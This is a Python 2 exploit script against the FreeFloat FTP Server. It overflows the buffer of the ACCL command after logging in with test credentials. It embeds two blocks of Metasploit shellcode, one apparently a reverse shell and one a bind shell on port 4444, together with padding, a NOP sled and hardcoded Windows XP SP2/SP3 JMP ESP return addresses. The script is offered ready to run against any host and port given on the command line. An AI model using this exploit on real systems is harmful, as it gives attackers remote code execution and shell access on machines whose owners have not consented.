


#!/usr/bin/python
#
# Modifed from the Exploit Title: FreeFloat FTP Server ACCL Buffer Overflow Exploit () by mortis

from socket import *
import sys, struct, os

###RET = struct.pack('<L', 0x7C9D30D7)

def sploit(host, port):
    #open listener shell on port 4444
    
    
    ## For Reverse Shell to Work i had to Make the Exit Funtion a "Process" in Metasploit Shellcode generator
    
    RevSC = ("\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7d"
    "\xb1\x1e\xd4\x83\xeb\xfc\xe2\xf4\x81\xdb\xf5\x99\x95\x48\xe1\x2b"
    "\x82\xd1\x95\xb8\x59\x95\x95\x91\x41\x3a\x62\xd1\x05\xb0\xf1\x5f"
    "\x32\xa9\x95\x8b\x5d\xb0\xf5\x9d\xf6\x85\x95\xd5\x93\x80\xde\x4d"
    "\xd1\x35\xde\xa0\x7a\x70\xd4\xd9\x7c\x73\xf5\x20\x46\xe5\x3a\xfc"
    "\x08\x54\x95\x8b\x59\xb0\xf5\xb2\xf6\xbd\x55\x5f\x22\xad\x1f\x3f"
    "\x7e\x9d\x95\x5d\x11\x95\x02\xb5\xbe\x80\xc5\xb0\xf6\xf2\x2e\x5f"
    "\x3d\xbd\x95\xa4\x61\x1c\x95\x94\x75\xef\x76\x5a\x33\xbf\xf2\x84"
    "\x82\x67\x78\x87\x1b\xd9\x2d\xe6\x15\xc6\x6d\xe6\x22\xe5\xe1\x04"
    "\x15\x7a\xf3\x28\x46\xe1\xe1\x02\x22\x38\xfb\xb2\xfc\x5c\x16\xd6"
    "\x28\xdb\x1c\x2b\xad\xd9\xc7\xdd\x88\x1c\x49\x2b\xab\xe2\x4d\x87"
    "\x2e\xf2\x4d\x97\x2e\x4e\xce\xbc\x4b\xf9\x02\x7b\x1b\xd9\x0f\x88"
    "\x1b\xe2\x97\x35\xe8\xd9\xf2\x2d\xd7\xd1\x49\x2b\xab\xdb\x0e\x85"
    "\x28\x4e\xce\xb2\x17\xd5\x78\xbc\x1e\xdc\x74\x84\x24\x98\xd2\x5d"
    "\x9a\xdb\x5a\x5d\x9f\x80\xde\x27\xd7\x24\x97\x29\x83\xf3\x33\x2a"
    "\x3f\x9d\x93\xae\x45\x1a\xb5\x7f\x15\xc3\xe0\x67\x6b\x4e\x6b\xfc"
    "\x82\x67\x45\x83\x2f\xe0\x4f\x85\x17\xb0\x4f\x85\x28\xe0\xe1\x04"
    "\x15\x1c\xc7\xd1\xb3\xe2\xe1\x02\x17\x4e\xe1\xe3\x82\x61\x76\x33"
    "\x04\x77\x67\x2b\x08\xb5\xe1\x02\x82\xc6\xe2\x2b\xad\xd9\x60\x0c"
    "\x9f\xc2\x4d\x2b\xab\x4e\xce\xd4")
    
    
    ##/* win32_bind -  EXITFUNC=process LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
    sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
    sc += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
    sc += "\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
    sc += "\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
    sc += "\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
    sc += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
    sc += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
    sc += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
    sc += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
    sc += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
    sc += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
    sc += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
    sc += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
    sc += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
    sc += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
    sc += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
    sc += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
    sc += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
    sc += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
    sc += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
    sc += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
    sc += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
    sc += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
    sc += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
    sc += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"
    

    
    
    ### 246
    #### Offset off by ne byte, checked EIP over write in Win
    padding = "A"*246
    sled = "\x90"*20
    
    ### WINXP SP3 7E429353   FFE4             JMP ESP
    ### WINXP SP2 7C941EED   FFE4             JMP ESP
    
    WINXPSP2 = struct.pack('<L',0x7C941EED)
    WINXPSP3 = struct.pack('<L',0x7E429353)
    
    
    
    sploit = padding + WINXPSP2 + sled + RevSC
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((host,port))
    print "connected"
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send("PASS test\r\n")
    s.recv(1024)
    s.send("ACCL "+sploit+"\r\n")
    s.close()

if __name__ == '__main__':
    if (len(sys.argv) < 3):
        print "\nUsage: freefloat.py <host> <port> \n"
        sys.exit()
    else:
        host = sys.argv[1]
        port = sys.argv[2]
        sploit(host, int(port))
